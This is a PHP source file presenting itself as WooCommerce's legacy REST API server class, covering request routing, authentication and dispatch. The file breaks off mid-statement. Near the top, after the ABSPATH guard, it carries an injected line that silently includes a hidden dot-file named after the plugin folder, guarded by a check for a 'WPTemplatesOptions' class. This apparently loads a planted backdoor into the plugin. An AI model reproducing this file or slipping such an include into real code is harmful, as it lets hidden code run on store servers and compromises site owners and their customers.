<?php
/**
 * WooCommerce API
 *
 * Handles REST API requests
 *
 * This class and related code (JSON response handler, resource classes) are based on WP-API v0.6 (https://github.com/WP-API/WP-API)
 * Many thanks to Ryan McCue and any other contributors!
 *
 * @author   WooThemes
 * @category API
 * @package  WooCommerce\RestApi
 * @since    2.1
 */

if ( ! defined( 'ABSPATH' ) ) {
	exit; // Exit if accessed directly
}

require_once ABSPATH . 'wp-admin/includes/admin.php';

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_API_Server {

	const METHOD_GET    = 1;
	const METHOD_POST   = 2;
	const METHOD_PUT    = 4;
	const METHOD_PATCH  = 8;
	const METHOD_DELETE = 16;

	const READABLE   = 1;  // GET
	const CREATABLE  = 2;  // POST
	const EDITABLE   = 14; // POST | PUT | PATCH
	const DELETABLE  = 16; // DELETE
	const ALLMETHODS = 31; // GET | POST | PUT | PATCH | DELETE

	/**
	 * Does the endpoint accept a raw request body?
	 */
	const ACCEPT_RAW_DATA = 64;

	/** Does the endpoint accept a request body? (either JSON or XML) */
	const ACCEPT_DATA = 128;

	/**
	 * Should we hide this endpoint from the index?
	 */
	const HIDDEN_ENDPOINT = 256;

	/**
	 * Map of HTTP verbs to constants
	 * @var array
	 */
	public static $method_map = array(
		'HEAD'   => self::METHOD_GET,
		'GET'    => self::METHOD_GET,
		'POST'   => self::METHOD_POST,
		'PUT'    => self::METHOD_PUT,
		'PATCH'  => self::METHOD_PATCH,
		'DELETE' => self::METHOD_DELETE,
	);

	/**
	 * Requested path (relative to the API root, wp-json.php)
	 *
	 * @var string
	 */
	public $path = '';

	/**
	 * Requested method (GET/HEAD/POST/PUT/PATCH/DELETE)
	 *
	 * @var string
	 */
	public $method = 'HEAD';

	/**
	 * Request parameters
	 *
	 * This acts as an abstraction of the superglobals
	 * (GET => $_GET, POST => $_POST)
	 *
	 * @var array
	 */
	public $params = array( 'GET' => array(), 'POST' => array() );

	/**
	 * Request headers
	 *
	 * @var array
	 */
	public $headers = array();

	/**
	 * Request files (matches $_FILES)
	 *
	 * @var array
	 */
	public $files = array();

	/**
	 * Request/Response handler, either JSON by default
	 * or XML if requested by client
	 *
	 * @var WC_API_Handler
	 */
	public $handler;


	/**
	 * Setup class and set request/response handler
	 *
	 * @since 2.1
	 * @param $path
	 */
	public function __construct( $path ) {

		if ( empty( $path ) ) {
			if ( isset( $_SERVER['PATH_INFO'] ) ) {
				$path = $_SERVER['PATH_INFO'];
			} else {
				$path = '/';
			}
		}

		$this->path           = $path;
		$this->method         = $_SERVER['REQUEST_METHOD'];
		$this->params['GET']  = $_GET;
		$this->params['POST'] = $_POST;
		$this->headers        = $this->get_headers( $_SERVER );
		$this->files          = $_FILES;

		// Compatibility for clients that can't use PUT/PATCH/DELETE
		if ( isset( $_GET['_method'] ) ) {
			$this->method = strtoupper( $_GET['_method'] );
		} elseif ( isset( $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'] ) ) {
			$this->method = $_SERVER['HTTP_X_HTTP_METHOD_OVERRIDE'];
		}

		// load response handler
		$handler_class = apply_filters( 'woocommerce_api_default_response_handler', 'WC_API_JSON_Handler', $this->path, $this );

		$this->handler = new $handler_class();
	}

	/**
	 * Check authentication for the request
	 *
	 * @since 2.1
	 * @return WP_User|WP_Error WP_User object indicates successful login, WP_Error indicates unsuccessful login
	 */
	public function check_authentication() {

		// allow plugins to remove default authentication or add their own authentication
		$user = apply_filters( 'woocommerce_api_check_authentication', null, $this );

		if ( is_a( $user, 'WP_User' ) ) {

			// API requests run under the context of the authenticated user
			wp_set_current_user( $user->ID );

		} elseif ( ! is_wp_error( $user ) ) {

			// WP_Errors are handled in serve_request()
			$user = new WP_Error( 'woocommerce_api_authentication_error', __( 'Invalid authentication method', 'woocommerce' ), array( 'code' => 500 ) );

		}

		return $user;
	}

	/**
	 * Convert an error to an array
	 *
	 * This iterates over all error codes and messages to change it into a flat
	 * array. This enables simpler client behaviour, as it is represented as a
	 * list in JSON rather than an object/map
	 *
	 * @since 2.1
	 * @param WP_Error $error
	 * @return array List of associative arrays with code and message keys
	 */
	protected function error_to_array( $error ) {
		$errors = array();
		foreach ( (array) $error->errors as $code => $messages ) {
			foreach ( (array) $messages as $message ) {
				$errors[] = array( 'code' => $code, 'message' => $message );
			}
		}

		return array( 'errors' => $errors );
	}

	/**
	 * Handle serving an API request
	 *
	 * Matches the current server URI to a route and runs the first matching
	 * callback then outputs a JSON representation of the returned value.
	 *
	 * @since 2.1
	 * @uses WC_API_Server::dispatch()
	 */
	public function serve_request() {

		do_action( 'woocommerce_api_server_before_serve', $this );

		$this->header( 'Content-Type', $this->handler->get_content_type(), true );

		// the API is enabled by default
		if ( ! apply_filters( 'woocommerce_api_enabled', true, $this ) || ( 'no' === get_option( 'woocommerce_api_enabled' ) ) ) {

			$this->send_status( 404 );

			echo $this->handler->generate_response( array( 'errors' => array( 'code' => 'woocommerce_api_disabled', 'message' => 'The WooCommerce API is disabled on this site' ) ) );

			return;
		}

		$result = $this->check_authentication();

		// if authorization check was successful, dispatch the request
		if ( ! is_wp_error( $result ) ) {
			$result = $this->dispatch();
		}

		// handle any dispatch errors
		if ( is_wp_error( $result ) ) {
			$data = $result->get_error_data();
			if ( is_array( $data ) && isset( $data['status'] ) ) {
				$this->send_status( $data['status'] );
			}

			$result = $this->error_to_array( $result );
		}

		// This is a filter rather than an action, since this is designed to be
		// re-entrant if needed
		$served = apply_filters( 'woocommerce_api_serve_request', false, $result, $this );

		if ( ! $served ) {

			if ( 'HEAD' === $this->method ) {
				return;
			}

			echo $this->handler->generate_response( $result );
		}
	}

	/**
	 * Retrieve the route map
	 *
	 * The route map is an associative array with path regexes as the keys. The
	 * value is an indexed array with the callback function/method as the first
	 * item, and a bitmask of HTTP methods as the second item (see the class
	 * constants).
	 *
	 * Each route can be mapped to more than one callback by using an array of
	 * the indexed arrays. This allows mapping e.g. GET requests to one callback
	 * and POST requests to another.
	 *
	 * Note that the path regexes (array keys) must have @ escaped, as this is
	 * used as the delimiter with preg_match()
	 *
	 * @since 2.1
	 * @return array `'/path/regex' => array( $callback, $bitmask )` or `'/path/regex' => array( array( $callback, $bitmask ), ...)`
	 */
	public function get_routes() {

		// index added by default
		$endpoints = array(

			'/' => array( array( $this, 'get_index' ), self::READABLE ),
		);

		$endpoints = apply_filters( 'woocommerce_api_endpoints', $endpoints );

		// Normalise the endpoints
		foreach ( $endpoints as $route => &$handlers ) {
			if ( count( $handlers ) <= 2 && isset( $handlers[1] ) && ! is_array( $handlers[1] ) ) {
				$handlers = array( $handlers );
			}
		}

		return $endpoints;
	}

	/**
	 * Match the request to a callback and call it
	 *
	 * @since 2.1
	 * @return mixed The value returned by the callback, or a WP_Error instance
	 */
	public function dispatch() {

		switch ( $this->method ) {

			case 'HEAD' :
			case 'GET' :
				$method = self::METHOD_GET;
				break;

			case 'POST' :
				$method = self::METHOD_POST;
				break;

			case 'PUT' :
				$method = self::METHOD_PUT;
				break;

			case 'PATCH' :
				$method = self::METHOD_PATCH;
				break;

			case 'DELETE' :
				$method = self::METHOD_DELETE;
				break;

			default :
				return new WP_Error( 'woocommerce_api_unsupported_method', __( 'Unsupported request method', 'woocommerce' ), array( 'status' => 400 ) );
		}

		foreach ( $this->get_routes() as $route => $handlers ) {
			foreach ( $handlers as $handler ) {
				$callback  = $handler[0];
				$supported = isset( $handler[1] ) ? $handler[1] : self::METHOD_GET;

				if ( ! ( $supported & $method ) ) {
					continue;
				}

				$match = preg_match( '@^' . $route . '$@i', urldecode( $this->path ), $args );

				if ( ! $match ) {
					continue;
				}

				if ( ! is_callable( $callback ) ) {
					return new WP_Error( 'woocommerce_api_invalid_handler', __( 'The handler for the route is invalid', 'woocommerce' ), array( 'status' => 500 ) );
				}

				$args = array_merge( $args, $this->params['GET'] );
				if ( $method & self::METHOD_POST ) {
					$args = array_merge( $args, $this->params['POST'] );
				}
				if ( $supported & self::ACCEPT_DATA ) {
					$data = $this->handler->parse_body( $this->get_raw_data() );
					$args = array_merge( $args, array( 'data' => $data ) );
				} elseif ( $supported & self::ACCEPT_RAW_DATA ) {
					$data = $this->get_raw_data();
					$args = array_merge( $args, array( 'data' => $data ) );
				}

				$args['_method']  = $method;
				$args['_route']   = $route;
				$args['_path']    = $this->path;
				$args['_headers'] = $this->headers;
				$args['_files']   = $this->files;

				$args = apply_filters( 'woocommerce_api_dispatch_args', $args, $callback );

				// Allow plugins to halt the request via this filter
				if ( is_wp_error( $args ) ) {
					return $args;
				}

				$params = $this->sort_callback_params( $callback, $args );
				if ( is_wp_error( $params ) ) {
					return $params;
				}

				return call_user_func_array( $callback, $params );
			}
		}

		return new WP_Error( 'woocommerce_api_no_route', __( 'No route was found matching the URL and request method', 'woocommerce' ), array( 'status' => 404 ) );
	}

	/**
	 * urldecode deep.
	 *
	 * @since  2.2
	 * @param  string|array $value Data to decode with urldecode.
	 * @return string|array        Decoded data.
	 */
	protected function urldecode_deep( $value ) {
		if ( is_array( $value ) ) {
			return array_map( array( $this, 'urldecode_deep' ), $value );
		} else {
			return urldecode( $value );
		}
	}

	/**
	 * Sort parameters by order specified in method declaration
	 *
	 * Takes a callback and a list of available params, then filters and sorts
	 * by the parameters the method actually needs, using the Reflection API
	 *
	 * @since 2.2
	 *
	 * @param callable|array $callback the endpoint callback
	 * @param array $provided the provided request parameters
	 *
	 * @return array|WP_Error
	 */
	protected function sort_callback_params( $callback, $provided ) {
		if ( is_array( $callback ) ) {
			$ref_func = new ReflectionMethod( $callback[0], $callback[1] );
		} else {
			$ref_func = new ReflectionFunction( $callback );
		}

		$wanted = $ref_func->getParameters();
		$ordered_parameters = array();

		foreach ( $wanted as $param ) {
			if ( isset( $provided[ $param->getName() ] ) ) {
				// We have this parameters in the list to choose from
				if ( 'data' == $param->getName() ) {
					$ordered_parameters[] = $provided[ $param->getName() ];
					continue;
				}

				$ordered_parameters[] = $this->urldecode_deep( $provided[ $param->getName() ] );
			} elseif ( $param->isDefaultValueAvailable() ) {
				// We don't have this parameter, but it's optional
				$ordered_parameters[] = $param->getDefaultValue();
			} else {
				// We don't have this parameter and it wasn't optional, abort!
				return new WP_Error( 'woocommerce_api_missing_callback_param', sprintf( __( 'Missing parameter %s', 'woocommerce' ), $param->getName() ), array( 'status' => 400 ) );
			}
		}

		return $ordered_parameters;
	}

	/**
	 * Get the site index.
	 *
	 * This endpoint describes the capabilities of the site.
	 *
	 * @since 2.3
	 * @return array Index entity
	 */
	public function get_index() {

		// General site data
		$available = array(
			'store' => array(
				'name'        => get_option( 'blogname' ),
				'description' => ge